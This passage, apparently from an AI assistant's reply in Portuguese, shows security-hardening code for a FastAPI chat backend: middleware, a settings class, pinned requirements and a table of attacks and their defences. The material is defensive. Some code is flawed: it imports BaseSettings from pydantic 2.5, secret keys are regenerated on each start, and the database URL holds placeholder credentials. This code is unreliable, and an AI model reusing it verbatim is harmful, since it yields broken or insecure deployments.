    version="1.0.0"
)

# MEDIDA 1: CORS configurado corretamente
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.ALLOWED_ORIGINS,  # Apenas domínios confiáveis
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"],
    max_age=3600
)

# MEDIDA 2: Security headers
app.add_middleware(SecurityHeadersMiddleware)

# MEDIDA 3: Rate limiting
app.add_middleware(RateLimitMiddleware)

# MEDIDA 4: CSRF protection
app.add_middleware(CsrfMiddleware)

# Configurar WebSocket
jwtHandler = JwtHandler()
socketManager = SocketManager(jwtHandler)

# Criar aplicação Socket.IO
sio_app = socketio.ASGIApp(
    socketManager.sio,
    app,
    socketio_path='/socket'
)

# Registrar rotas
app.include_router(auth.router, prefix="/api/auth", tags=["Authentication"])
app.include_router(users.router, prefix="/api/users", tags=["Users"])
app.include_router(messages.router, prefix="/api/messages", tags=["Messages"])

# Health check
@app.get("/health")
async def healthCheck():
    return {"status": "healthy"}

# Executar
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        sio_app,
        host="0.0.0.0",
        port=8000,
        ssl_keyfile="/path/to/privkey.pem",   # HTTPS obrigatório
        ssl_certfile="/path/to/fullchain.pem",
        timeout_keep_alive=5,
        limit_concurrency=1000
    )
```

### 7.3 Configurações

```python
# backend/config.py
from pydantic import BaseSettings
from typing import List
import secrets

class Settings(BaseSettings):
    # MEDIDA 5: Variáveis de ambiente para secrets
    JWT_SECRET_KEY: str = secrets.token_urlsafe(32)
    JWT_REFRESH_SECRET_KEY: str = secrets.token_urlsafe(32)
    ENCRYPTION_MASTER_KEY: str = secrets.token_urlsafe(32)
    ENCRYPTION_SALT: str = secrets.token_urlsafe(16)
    
    # Database
    DATABASE_URL: str = "postgresql://user:pass@localhost/noharm"
    REDIS_URL: str = "redis://localhost:6379"
    
    # CORS
    ALLOWED_ORIGINS: List[str] = [
        "https://noharm.app",
        "https://www.noharm.app"
    ]
    
    # Rate Limiting
    MAX_REQUESTS_PER_MINUTE: int = 60
    MAX_WEBSOCKET_CONNECTIONS: int = 5
    
    # Security
    BCRYPT_ROUNDS: int = 12
    ACCESS_TOKEN_EXPIRE_MINUTES: int = 15
    REFRESH_TOKEN_EXPIRE_DAYS: int = 7
    
    class Config:
        env_file = ".env"

settings = Settings()
```

### 7.4 Requirements.txt

```txt
# backend/requirements.txt

# Framework
fastapi==0.104.1
uvicorn[standard]==0.24.0
python-socketio==5.10.0
python-multipart==0.0.6

# Security
python-jose[cryptography]==3.3.0
passlib[bcrypt]==1.7.4
bcrypt==4.1.1
cryptography==41.0.7
pydantic[email]==2.5.0

# Database
sqlalchemy==2.0.23
psycopg2-binary==2.9.9
redis==5.0.1

# Validation & Sanitization
bleach==6.1.0
email-validator==2.1.0

# Monitoring
python-json-logger==2.0.7

# Testing
pytest==7.4.3
pytest-asyncio==0.21.1
httpx==0.25.2
```

---

## Resumo de Proteções por Tipo de Ataque

| Ataque | Medidas de Proteção | Implementação |
|--------|---------------------|---------------|
| **JWT Theft** | Tokens curtos (15min), blacklist, JTI único, regeneração | `jwtHandler.py` |
| **Brute Force** | Rate limiting por IP/usuário, lockout progressivo, CAPTCHA | `rateLimiter.py` |
| **SQL Injection** | ORM (SQLAlchemy), parametrização, validação | `userRepository.py` |
| **NoSQL Injection** | Validação de tipos, sanitização de $, whitelist | `mongoRepository.py` |
| **XSS** | Sanitização HTML, CSP headers, validação | `sanitizer.py` |
| **CSRF** | CSRF tokens, SameSite cookies, validação de origem | `csrfProtection.py` |
| **Session Fixation** | Regeneração de session ID, validação de IP/UA | `sessionManager.py` |
| **DoS/DDoS** | Rate limiting multicamadas, timeouts, burst protection | `advancedRateLimiter.py` |
| **Slowloris** | Timeouts curtos, limites de conexão, Nginx | `main.py`, nginx.conf |
| **Data Exposure** | DTOs (Pydantic), sanitização de logs, response_model | `userModel.py` |
| **Mass Assignment** | Whitelist de campos, validação Pydantic, auditoria | `userRoutes.py` |
| **WebSocket Hijacking** | Autenticação JWT, rate limiting, validação | `socketManager.py` |

---

**Próximos passos:**
1. Implementar Redis para blacklist de tokens
2. Configurar monitoramento (Sentry, Datadog)
3. Testes de penetração
4. Auditoria de segurança

Quer que eu detalhe alguma seção específica?
